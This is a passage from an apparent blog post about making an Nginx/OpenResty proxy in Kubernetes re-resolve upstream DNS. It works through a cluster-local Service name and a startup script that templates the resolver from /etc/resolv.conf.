kind: Deployment
metadata:
  name: nginx
spec:
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: openresty/openresty:trusty
        ports:
          - name: https
            containerPort: 443
            protocol: TCP
        volumeMounts:
          - name: nginx-config
            mountPath: /etc/nginx/conf.d
      volumes:
        - name: nginx-config
          configMap:
            name: nginx-config
</code></pre>

<p>The <code>nginx-config</code> ConfigMap was</p>

<pre><code class="yaml">apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-config
data:
  nginx.conf: |
    upstream foo {
      server foo.example.com.:443;
    }

    server {
      ...

      # use regex capture to preserve url path and query params
      location ~* /_foo/(.*) {
        proxy_pass https://foo/$1;
        ...
      }
    }
</code></pre>

<p>I replaced <code>upstream</code> with the same pattern above, but in this case when I needed to define
<code>resolver</code> I couldn&rsquo;t use <code>127.0.0.1</code> because there&rsquo;s no Bind running locally. I can&rsquo;t hardcode the
resolver because it might change.</p>

<h3>Solution: run Nginx and foo on the same K8s cluster and use the cluster-local Service DNS record</h3>

<p>If Nginx and foo run on the same K8s cluster, I can use the cluster-local DNS record created by a
K8s Service matching the foo Pods. A Service like this</p>

<pre><code class="yaml">apiVersion: v1
kind: Service
metadata:
  name: foo
  namespace: bar
...
</code></pre>

<p>will create a DNS A record <code>foo.bar.svc.cluster.local.</code> pointing to the K8s Service&rsquo;s IP.
Since this Service&rsquo;s IP is stable and it load balances requests to the underlying Pods, there&rsquo;s no need for Nginx to
periodically lookup the Pod IPs. I can keep the <code>upstream</code> block like so.</p>

<pre><code>upstream foo {
  server foo.bar.svc.cluster.local.:443;
}
</code></pre>

<p>As its name implies, <code>foo.bar.svc.cluster.local.</code> is only resolvable within the cluster. So
Nginx has to be running on the same cluster as foo.</p>

<h3>Solution: dynamically set the Nginx <code>resolver</code> equal to the system&rsquo;s when the Pod starts</h3>

<p>What if Nginx is on another K8s cluster? Then I can set <code>resolver</code> to the IP of one of the
nameservers in <code>/etc/resolv.conf</code>. After a bunch of tinkering I came up with this way to dynamically
set the Nginx <code>resolver</code> when the Pod starts. A placeholder for <code>resolver</code> is set in the Nginx
ConfigMap, and a command at Pod startup copies over the templated config and replaces the
placeholder with a nameserver IP from <code>/etc/resolv.conf</code>.</p>

<p>Change <code>nginx-config</code> ConfigMap to</p>

<pre><code class="yaml">apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-config
data:
  nginx.conf.template: |
    server {
      ...

      # This directive is dynamic because we set it to the
      # kube-dns Service IP which is different for each cluster.
      resolver $NAMESERVER;

      set $foo_url foo.example.com.;

      # use regex capture to preserve url path and query params
      location ~* /_foo/(.*) {
        proxy_pass https://$foo_url/$1;
        ...
      }
    }
</code></pre>

<p>Deployment YAML then becomes (note the added <code>command</code>, <code>args</code>, and new <code>volume</code> and <code>volumeMount</code>).</p>

<pre><code class="yaml">apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
spec:
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: openresty/openresty:trusty
        command: ['/bin/bash', '-c']
        args:
        - |
          export NAMESERVER=$(grep 'nameserver' /etc/resolv.conf | awk '{print $2}' | tr '\n' ' ')
          echo "Nameserver is: $NAMESERVER"
          echo 'Copying nginx config'
          envsubst '$NAMESERVER' &lt; /etc/nginx/conf.d.template/nginx.conf.template &gt; /etc/nginx/conf.d/nginx.conf
          echo 'Using nginx config:'
          cat /etc/nginx/conf.d/nginx.conf
          echo 'Starting nginx'
          nginx -g 'daemon off;'
        ports:
          - name: https
            containerPort: 443
            protocol: TCP
        volumeMounts:
          - name: nginx-config-template
            mountPath: /etc/nginx/conf.d.template
          - name: nginx-config
            mountPath: /etc/nginx/conf.d
      volumes:
        - name: nginx-config
          emptyDir: {}
        - name: nginx-config-template
          configMap:
            name: nginx-config
</code></pre>

<p>A <code>volume</code> of type <code>emptyDir</code> is needed because recent versions of K8s made configMap volumes
read-only. EmptyDir types are writable.</p>

<p>Hopefully this helps some people out there who don&rsquo;t want to spend as much time as I did Googling
obscure Nginx behavior.</p>
]]></content>
  </entry>
  
</feed>
